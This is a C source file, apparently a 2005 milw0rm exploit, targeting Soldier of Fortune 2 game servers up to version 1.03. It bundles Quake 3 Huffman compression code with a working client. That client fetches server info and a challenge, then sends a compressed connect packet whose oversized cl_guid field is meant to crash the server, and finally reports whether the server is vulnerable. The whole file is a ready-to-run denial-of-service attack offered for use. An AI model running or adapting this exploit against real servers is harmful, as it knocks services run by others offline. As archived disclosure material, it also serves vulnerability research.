@@ -1,0 +1,1044 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+/*
+
+Quake 3 engine Huffman algorithm 0.2
+
+ALL the code comes from the Q3fusion project of Andrey Nazarov:
+
+  http://sourceforge.net/projects/q3fusion/
+
+I have simply modified some variables and the prototype of the
+decompressing and compressing functions for a faster and simpler
+usage.
+
+by Luigi Auriemma
+e-mail: aluigi@autistici.org
+web:    http://aluigi.altervista.org
+
+*/
+
+
+
+#include <string.h>
+
+#define MAX_MSGLEN          0x4000
+
+#define VALUE(a)			((int   )(a))
+#define NODE(a)				((void *)(a))
+
+#define NODE_START			NODE(  1)
+#define NODE_NONE			NODE(256)
+#define NODE_NEXT			NODE(257)
+
+#define NOT_REFERENCED		256
+
+#define HUFF_TREE_SIZE		7175
+typedef void				*tree_t[HUFF_TREE_SIZE];
+
+//
+// pre-defined frequency counts for all bytes [0..255]
+//
+static int huffCounts[256] = {
+	0x3D1CB, 0x0A0E9, 0x01894, 0x01BC2, 0x00E92, 0x00EA6, 0x017DE, 0x05AF3,
+	0x08225, 0x01B26, 0x01E9E, 0x025F2, 0x02429, 0x0436B, 0x00F6D, 0x006F2,
+	0x02060, 0x00644, 0x00636, 0x0067F, 0x0044C, 0x004BD, 0x004D6, 0x0046E,
+	0x006D5, 0x00423, 0x004DE, 0x0047D, 0x004F9, 0x01186, 0x00AF5, 0x00D90,
+	0x0553B, 0x00487, 0x00686, 0x0042A, 0x00413, 0x003F4, 0x0041D, 0x0042E,
+	0x006BE, 0x00378, 0x0049C, 0x00352, 0x003C0, 0x0030C, 0x006D8, 0x00CE0,
+	0x02986, 0x011A2, 0x016F9, 0x00A7D, 0x0122A, 0x00EFD, 0x0082D, 0x0074B,
+	0x00A18, 0x0079D, 0x007B4, 0x003AC, 0x0046E, 0x006FC, 0x00686, 0x004B6,
+	0x01657, 0x017F0, 0x01C36, 0x019FE, 0x00E7E, 0x00ED3, 0x005D4, 0x005F4,
+	0x008A7, 0x00474, 0x0054B, 0x003CB, 0x00884, 0x004E0, 0x00530, 0x004AB,
+	0x006EA, 0x00436, 0x004F0, 0x004F2, 0x00490, 0x003C5, 0x00483, 0x004A2,
+	0x00543, 0x004CC, 0x005F9, 0x00640, 0x00A39, 0x00800, 0x009F2, 0x00CCB,
+	0x0096A, 0x00E01, 0x009C8, 0x00AF0, 0x00A73, 0x01802, 0x00E4F, 0x00B18,
+	0x037AD, 0x00C5C, 0x008AD, 0x00697, 0x00C88, 0x00AB3, 0x00DB8, 0x012BC,
+	0x00FFB, 0x00DBB, 0x014A8, 0x00FB0, 0x01F01, 0x0178F, 0x014F0, 0x00F54,
+	0x0131C, 0x00E9F, 0x011D6, 0x012C7, 0x016DC, 0x01900, 0x01851, 0x02063,
+	0x05ACB, 0x01E9E, 0x01BA1, 0x022E7, 0x0153D, 0x01183, 0x00E39, 0x01488,
+	0x014C0, 0x014D0, 0x014FA, 0x00DA4, 0x0099A, 0x0069E, 0x0071D, 0x00849,
+	0x0077C, 0x0047D, 0x005EC, 0x00557, 0x004D4, 0x00405, 0x004EA, 0x00450,
+	0x004DD, 0x003EE, 0x0047D, 0x00401, 0x004D9, 0x003B8, 0x00507, 0x003E5,
+	0x006B1, 0x003F1, 0x004A3, 0x0036F, 0x0044B, 0x003A1, 0x00436, 0x003B7,
+	0x00678, 0x003A2, 0x00481, 0x00406, 0x004EE, 0x00426, 0x004BE, 0x00424,
+	0x00655, 0x003A2, 0x00452, 0x00390, 0x0040A, 0x0037C, 0x00486, 0x003DE,
+	0x00497, 0x00352, 0x00461, 0x00387, 0x0043F, 0x00398, 0x00478, 0x00420,
+	0x00D86, 0x008C0, 0x0112D, 0x02F68, 0x01E4E, 0x00541, 0x0051B, 0x00CCE,
+	0x0079E, 0x00376, 0x003FF, 0x00458, 0x00435, 0x00412, 0x00425, 0x0042F,
+	0x005CC, 0x003E9, 0x00448, 0x00393, 0x0041C, 0x003E3, 0x0042E, 0x0036C,
+	0x00457, 0x00353, 0x00423, 0x00325, 0x00458, 0x0039B, 0x0044F, 0x00331,
+	0x0076B, 0x00750, 0x003D0, 0x00349, 0x00467, 0x003BC, 0x00487, 0x003B6,
+	0x01E6F, 0x003BA, 0x00509, 0x003A5, 0x00467, 0x00C87, 0x003FC, 0x0039F,
+	0x0054B, 0x00300, 0x00410, 0x002E9, 0x003B8, 0x00325, 0x00431, 0x002E4,
+	0x003F5, 0x00325, 0x003F0, 0x0031C, 0x003E4, 0x00421, 0x02CC1, 0x034C0
+};
+
+
+//
+// static Huffman tree
+//
+static tree_t	huffTree;
+
+//
+// received from MSG_* code
+//
+static int		huffBitPos;
+
+
+/*
+=======================================================================================
+
+  HUFFMAN TREE CONSTRUCTION
+
+=======================================================================================
+*/
+
+/*
+============
+Huff_PrepareTree
+============
+*/
+void Huff_PrepareTree( tree_t tree ) {
+	void **node;
+	
+	memset( tree, 0, sizeof( tree_t ) );
+	
+	// create first node
+	node = &tree[263];
+	VALUE( tree[0] )++;
+
+	node[7] = NODE_NONE;
+	tree[2] = node;
+	tree[3] = node;
+	tree[4] = node;
+	tree[261] = node;
+}
+
+
+
+/*
+============
+Huff_GetNode
+============
+*/
+void **Huff_GetNode( void **tree ) {
+	void **node;
+	int	value;
+
+	node = tree[262];
+	if( !node ) {
+		value = VALUE( tree[1] )++;
+		node = &tree[value + 6407];
+		return node;
+	}
+
+	tree[262] = node[0];
+	return node;
+}
+
+/*
+============
+Huff_Swap
+============
+*/
+void Huff_Swap( void **tree1, void **tree2, void **tree3 ) {
+	void **a, **b;
+
+	a = tree2[2];
+	if( a ) {
+		if( a[0] == tree2 ) {
+			a[0] = tree3;
+		} else {
+			a[1] = tree3;
+		}
+	} else {
+		tree1[2] = tree3;
+	}
+
+	b = tree3[2];
+
+	if( b ) {
+		if( b[0] == tree3 ) {
+			b[0] = tree2;
+			tree2[2] = b;
+			tree3[2] = a;
+			return;
+		}
+
+		b[1] = tree2;
+		tree2[2] = b;
+		tree3[2] = a;
+		return;
+	}
+
+	tree1[2] = tree2;
+	tree2[2] = NULL;
+	tree3[2] = a;
+}
+
+/*
+============
+Huff_SwapTrees
+============
+*/
+void Huff_SwapTrees( void **tree1, void **tree2 ) {
+	void **temp;
+
+	temp = tree1[3];
+	tree1[3] = tree2[3];
+	tree2[3] = temp;
+
+	temp = tree1[4];
+	tree1[4] = tree2[4];
+	tree2[4] = temp;
+
+	if( tree1[3] == tree1 ) {
+		tree1[3] = tree2;
+	}
+
+	if( tree2[3] == tree2 ) {
+		tree2[3] = tree1;
+	}
+
+	temp = tree1[3];
+	if( temp ) {
+		temp[4] = tree1;
+	}
+
+	temp = tree2[3];
+	if( temp ) {
+		temp[4] = tree2;
+	}
+
+	temp = tree1[4];
+	if( temp ) {
+		temp[3] = tree1;
+	}
+
+	temp = tree2[4];
+	if( temp ) {
+		temp[3] = tree2;
+	}
+
+}
+
+/*
+============
+Huff_DeleteNode
+============
+*/
+void Huff_DeleteNode( void **tree1, void **tree2 ) {
+	tree2[0] = tree1[262];
+	tree1[262] = tree2;
+}
+
+/*
+============
+Huff_IncrementFreq_r
+============
+*/
+static void Huff_IncrementFreq_r( void **tree1, void **tree2 ) {
+	void **a, **b;
+
+	if( !tree2 ) {
+		return;
+	}
+
+	a = tree2[3];
+	if( a ) {
+		a = a[6];
+		if( a == tree2[6] ) {
+			b = tree2[5];
+			if( b[0] != tree2[2] ) {
+				Huff_Swap( tree1, b[0], tree2 );
+			}
+			Huff_SwapTrees( b[0], tree2 );
+		}
+	}
+
+	a = tree2[4];
+	if( a && a[6] == tree2[6] ) {
+		b = tree2[5];
+		b[0] = a;
+	} else {
+		a = tree2[5];
+		a[0] = 0;
+		Huff_DeleteNode( tree1, tree2[5] );
+	}
+
+	
+	VALUE( tree2[6] )++;
+	a = tree2[3];
+	if( a && a[6] == tree2[6] ) {
+		tree2[5] = a[5];
+	} else {
+		a = Huff_GetNode( tree1 );
+		tree2[5] = a;
+		a[0] = tree2;
+	}
+
+	if( tree2[2] ) {
+		Huff_IncrementFreq_r( tree1, tree2[2] );
+	
+		if( tree2[4] == tree2[2] ) {
+			Huff_SwapTrees( tree2, tree2[2] );
+			a = tree2[5];
+
+			if( a[0] == tree2 ) {
+				a[0] = tree2[2];
+			}
+		}
+	}
+}
+
+/*
+============
+Huff_AddReference
+
+Insert 'ch' into the tree or increment it's frequency
+============
+*/
+static void Huff_AddReference( void **tree, int ch ) {
+	void **a, **b, **c, **d;
+	int value;
+
+	ch &= 255;
+	if( tree[ch + 5] ) {
+		Huff_IncrementFreq_r( tree, tree[ch + 5] );
+		return; // already added
+	}
+
+	value = VALUE( tree[0] )++;
+	b = &tree[value * 8 + 263];
+
+	value = VALUE( tree[0] )++;
+	a = &tree[value * 8 + 263];
+
+	a[7] = NODE_NEXT;
+	a[6] = NODE_START;
+	d = tree[3];
+	a[3] = d[3];
+	if( a[3] ) {
+		d = a[3];
+		d[4] = a;
+		d = a[3];
+		if( d[6] == NODE_START ) {
+			a[5] = d[5];
+		} else {
+			d = Huff_GetNode( tree );
+			a[5] = d;
+			d[0] = a;
+		}
+	} else {
+		d = Huff_GetNode( tree );
+		a[5] = d;
+		d[0] = a;
+
+	}
+	
+	d = tree[3];
+	d[3] = a;
+	a[4] = tree[3];
+	b[7] = NODE( ch );
+	b[6] = NODE_START;
+	d = tree[3];
+	b[3] = d[3];
+	if( b[3] ) {
+		d = b[3];
+		d[4] = b;
+		if( d[6] == NODE_START ) {
+			b[5] = d[5];
+		} else {
+			d = Huff_GetNode( tree );
+			b[5] = d;
+			d[0] = a;
+		}
+	} else {
+		d = Huff_GetNode( tree );
+		b[5] = d;
+		d[0] = b;
+	}
+
+	d = tree[3];
+	d[3] = b;
+	b[4] = tree[3];
+	b[1] = NULL;
+	b[0] = NULL;
+	d = tree[3];
+	c = d[2];
+	if( c ) {
+		if( c[0] == tree[3] ) {
+			c[0] = a;
+		} else {
+			c[1] = a;
+		}
+	} else {
+		tree[2] = a;
+	}
+
+	a[1] = b;
+	d = tree[3];
+	a[0] = d;
+	a[2] = d[2];
+	b[2] = a;
+	d = tree[3];
+	d[2] = a;
+	tree[ch + 5] = b;
+
+	Huff_IncrementFreq_r( tree, a[2] );
+}
+
+/*
+=======================================================================================
+
+  BITSTREAM I/O
+
+=======================================================================================
+*/
+
+/*
+============
+Huff_EmitBit
+
+Put one bit into buffer
+============
+*/
+void Huff_EmitBit( int bit, unsigned char *buffer ) {
+	if( !(huffBitPos & 7) ) {
+		buffer[huffBitPos >> 3] = 0;
+	}
+
+	buffer[huffBitPos >> 3] |= bit << (huffBitPos & 7);
+	huffBitPos++;
+}
+
+/*
+============
+Huff_GetBit
+
+Read one bit from buffer
+============
+*/
+int Huff_GetBit( unsigned char *buffer ) {
+	int bit;
+
+	bit = buffer[huffBitPos >> 3] >> (huffBitPos & 7);
+	huffBitPos++;
+
+	return (bit & 1);
+}
+
+/*
+============
+Huff_EmitPathToByte
+============
+*/
+void Huff_EmitPathToByte( void **tree, void **subtree, unsigned char *buffer ) {
+	if( tree[2] ) {
+		Huff_EmitPathToByte( tree[2], tree, buffer );
+	}
+
+	if( !subtree ) {
+		return;
+	}
+
+	//
+	// emit tree walking control bits
+	//
+	if( tree[1] == subtree ) {
+		Huff_EmitBit( 1, buffer );
+	} else {
+		Huff_EmitBit( 0, buffer );
+	}
+}
+
+/*
+============
+Huff_GetByteFromTree
+
+Get one byte using dynamic or static tree
+============
+*/
+int Huff_GetByteFromTree( void **tree, unsigned char *buffer ) {
+	if( !tree ) {
+		return 0;
+	}
+
+	//
+	// walk through the tree until we get a value
+	//
+	while( tree[7] == NODE_NEXT ) {
+		if( !Huff_GetBit( buffer ) ) {
+			tree = tree[0];
+		} else {
+			tree = tree[1];
+		}
+
+		if( !tree ) {
+			return 0;
+		}
+	}
+
+	return VALUE( tree[7] );
+}
+
+/*
+============
+Huff_EmitByteDynamic
+
+Emit one byte using dynamic tree
+============
+*/
+static void Huff_EmitByteDynamic( void **tree, int value, unsigned char *buffer ) {
+	void **subtree;
+	int i;
+
+	//
+	// if byte was already referenced, emit path to it
+	//
+	subtree = tree[value + 5];
+	if( subtree ) {
+		if( subtree[2] ) {
+			Huff_EmitPathToByte( subtree[2], subtree, buffer );
+		}		
+		return;
+	}
+
+	//
+	// byte was not referenced, just emit 8 bits
+	//
+	Huff_EmitByteDynamic( tree, NOT_REFERENCED, buffer );
+
+	for( i=7 ; i>=0 ; i-- ) {
+		Huff_EmitBit( (value >> i) & 1, buffer );
+	}
+
+}
+
+/*
+=======================================================================================
+
+  PUBLIC INTERFACE
+
+=======================================================================================
+*/
+
+/*
+============
+Huff_CompressPacket
+
+Compress message using dynamic Huffman tree,
+beginning from specified offset
+============
+*/
+int Huff_CompressPacket( unsigned char *msg, int offset, int cursize ) {
+	tree_t	tree;
+	unsigned char	buffer[MAX_MSGLEN];
+	unsigned char	*data;
+	int		outLen;
+	int		inLen;
+	int		i;
+
+	data = msg + offset;
+	inLen = cursize - offset;	
+	if( inLen <= 0 || inLen >= MAX_MSGLEN ) {
+		return(cursize);
+	}
+
+	Huff_PrepareTree( tree );
+
+	buffer[0] = inLen >> 8;
+	buffer[1] = inLen & 0xFF;
+	huffBitPos = 16;
+
+	for( i=0 ; i<inLen ; i++ ) {
+		Huff_EmitByteDynamic( tree, data[i], buffer );
+		Huff_AddReference( tree, data[i] );
+	}
+	
+	outLen = (huffBitPos >> 3) + 1;
+
+	memcpy( data, buffer, outLen );
+	return(offset + outLen);
+}
+
+/*
+============
+Huff_DecompressPacket
+
+Decompress message using dynamic Huffman tree,
+beginning from specified offset
+============
+*/
+int Huff_DecompressPacket( unsigned char *msg, int offset, int cursize, int maxsize ) {
+	tree_t	tree;
+	unsigned char	buffer[MAX_MSGLEN];
+	unsigned char	*data;
+	int		outLen;
+	int		inLen;
+	int		i, j;
+	int		ch;
+
+	data = msg + offset;
+	inLen = cursize - offset;
+	if( inLen <= 0 ) {
+		return(cursize);
+	}
+
+	Huff_PrepareTree( tree );
+
+	outLen = (data[0] << 8) + data[1];
+	huffBitPos = 16;
+	
+	if( outLen > maxsize - offset ) {
+		outLen = maxsize - offset;
+	}
+
+	for( i=0 ; i<outLen ; i++ ) {
+		if( (huffBitPos >> 3) > inLen ) {
+			buffer[i] = 0;
+			break;
+		}
+
+		ch = Huff_GetByteFromTree( tree[2], data );
+
+		if( ch == NOT_REFERENCED ) {
+			ch = 0; // just read 8 bits
+			for( j=0 ; j<8 ; j++ ) {
+				ch <<= 1;
+				ch |= Huff_GetBit( data );
+			}
+		}
+
+		buffer[i] = ch;
+		Huff_AddReference( tree, ch );
+	}
+
+	memcpy( data, buffer, outLen );
+	return(offset + outLen);
+}
+
+/*
+============
+Huff_EmitByte
+============
+*/
+void Huff_EmitByte( int ch, unsigned char *buffer, int *count ) {
+	huffBitPos = *count;
+	Huff_EmitPathToByte( huffTree[ch + 5], NULL, buffer );
+	*count = huffBitPos;
+}
+
+/*
+============
+Huff_GetByte
+============
+*/
+int Huff_GetByte( unsigned char *buffer, int *count ) {
+	int ch;
+
+	huffBitPos = *count;
+	ch = Huff_GetByteFromTree( huffTree[2], buffer );
+	*count = huffBitPos;
+
+	return ch;
+}
+
+/*
+============
+Huff_Init
+============
+*/
+void Huff_Init( void ) {
+	int	i, j;
+
+	// build empty tree
+	Huff_PrepareTree( huffTree );
+
+	// add all pre-defined byte references
+	for( i=0 ; i<256 ; i++ ) {
+		for( j=0 ; j<huffCounts[i] ; j++ ) {
+			Huff_AddReference( huffTree, i );
+		}
+	}
+}
+
+/* str0ke insert */
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+
+
+    #define close   closesocket
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+    #ifndef strcasestr  // avoid warnings
+        extern char *strcasestr (__const char *__haystack, __const char *__needle)
+     __THROW __attribute_pure__;
+    #endif
+
+    #define stristr strcasestr
+#endif
+
+
+
+#define VER         "0.1"
+#define BUFFSZ      2048
+#define PORT        20100
+#define TIMEOUT     2
+#define INFO        "\xff\xff\xff\xff" "getinfo xxx\n"
+#define GETCH       "\xff\xff\xff\xff" "getchallenge\n"
+#define CONNECT     "\xff\xff\xff\xff" \
+                    "connect \"" \
+                    "\\challenge\\%s" \
+                    "\\qport\\%d" \
+                    "\\protocol\\%d" \
+                    "\\cl_guid\\%s"\
+                    "\\name\\%s" \
+                    "\\rate\\4500" \
+                    "\\snaps\\20" \
+                    "\\identity\\marinesoldier1" \
+                    "\\cl_anonymous\\0" \
+                    "\\cg_predictItems\\1" \
+                    "\\details\\5" \
+                    "\\cl_punkbuster\\%c" \
+                    "\""
+
+#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
+                      < 0) std_err();
+#define RECV        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
+                    if(len < 0) std_err();
+#define RECVT       if(timeout(sd) < 0) { \
+                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
+                        exit(1); \
+                    } \
+                    RECV;
+
+
+
+int create_hex_rand_string(u_char *data, int len, u_int tmp, int more);
+int getproto(u_char *buff);
+char getpunkb(u_char *buff);
+void showinfo(u_char *data);
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peer;
+    u_int   seed;
+    int     sd,
+            len,
+            proto;
+    u_short port = PORT;
+    u_char  buff[BUFFSZ + 1],
+            cl_guid[]  =    // something bigger than 64 bytes
+                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+            challenge[32],
+            nick[]     =
+                "0123456789abcdef",
+            punkbuster = 0;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Soldier of Fortune 2 <= 1.03 cl_guid server crash "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <server> [port(%d)]\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif    
+
+    if(argc > 2) port = atoi(argv[2]);
+
+    peer.sin_addr.s_addr = resolv(argv[1]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    fputs("- request informations:\n", stdout);
+    SEND(INFO, sizeof(INFO) - 1);
+    RECVT;
+    buff[len] = 0x00;
+
+    proto      = getproto(buff);
+    punkbuster = getpunkb(buff);
+    showinfo(buff);
+
+    fputs("- request challenge:\n", stdout);
+    SEND(GETCH, sizeof(GETCH) - 1);
+    RECVT;
+    buff[len] = 0x00;
+    if(!stristr(buff, "challenge")) {
+        fputs("\nError: no challenge string, try again\n\n", stdout);
+        exit(1);
+    }
+    strncpy(challenge, buff + 22, sizeof(challenge) - 1);
+    printf("- challenge: %s\n", challenge);
+
+    seed = ~time(NULL);
+    seed = create_hex_rand_string(nick, sizeof(nick) - 1, seed, 1);
+    seed = create_hex_rand_string(cl_guid, sizeof(cl_guid) - 1, seed, 0);
+
+    fputs("- send BOOM cl_guid\n", stdout);
+    len = snprintf(
+        buff,
+        BUFFSZ,
+        CONNECT,
+        challenge,
+        seed,
+        proto,
+        cl_guid,
+        nick,
+        punkbuster);
+    if((len < 0) || (len > BUFFSZ)) len = BUFFSZ;
+
+    len = Huff_CompressPacket(buff, 12, len);
+    SEND(buff, len);
+    if(timeout(sd) < 0) {
+        fputs("- timeout, resend again\n", stdout);
+        SEND(buff, len);
+    }
+    if(!timeout(sd)) {
+        RECV;
+        buff[len] = 0x00;
+        printf("\n* Message from server:\n  %s\n", buff + 4);
+    }
+
+    fputs("- check server:\n", stdout);
+    SEND(INFO, sizeof(INFO) - 1);
+    if(timeout(sd) < 0) {
+        fputs("\nServer IS vulnerable!!!\n\n", stdout);
+    } else {
+        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
+    }
+    close(sd);
+
+    return(0);
+}
+
+
+
+int create_hex_rand_string(u_char *data, int len, u_int tmp, int more) {
+    if(!tmp) tmp++;
+    if(more) {
+        len = tmp % len;
+        if(!len) len++;
+    }
+    while(len--) {
+        tmp = (*data + tmp) % 16;
+        if(tmp <= 9) {
+            *data = tmp + '0';
+        } else {
+            *data = (tmp - 10) + 'A';
+        }
+        data++;
+    }
+    *data = 0x00;
+    return(tmp << 1);
+}
+
+
+
+int getproto(u_char *buff) {
+    int     p;
+    u_char  *ptr;
+
+    ptr = stristr(buff, "\\protocol\\");
+    if(!ptr) {
+        fputs("\n"
+            "Error: No protocol informations in the answer of the server\n"
+            "       Is impossible to continue without this information\n"
+            "\n", stdout);
+        exit(1);
+    }
+    p = atoi(strchr(ptr + 1, '\\') + 1);
+    return(p);
+}    
+
+
+
+char getpunkb(u_char *buff) {
+    int     p;
+    u_char  *ptr;
+
+    ptr = stristr(buff, "\\punkbuster\\");
+    if(!ptr) ptr = stristr(buff, "\\pb\\");
+    if(ptr) {
+        p = *(strchr(ptr + 1, '\\') + 1);
+    } else p = '0';
+
+    return(p);
+}
+
+
+
+void showinfo(u_char *data) {
+    int     nt = 1;
+    u_char  *p;
+
+    while((p = strchr(data, '\\'))) {
+        *p = 0x00;
+        if(!nt) {
+            printf("%30s: ", data);
+            nt++;
+        } else {
+            printf("%s\n", data);
+            nt = 0;
+        }
+        data = p + 1;
+    }
+    printf("%s\n\n", data);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct  hostent *hp;
+    u_long  host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2005-02-24]
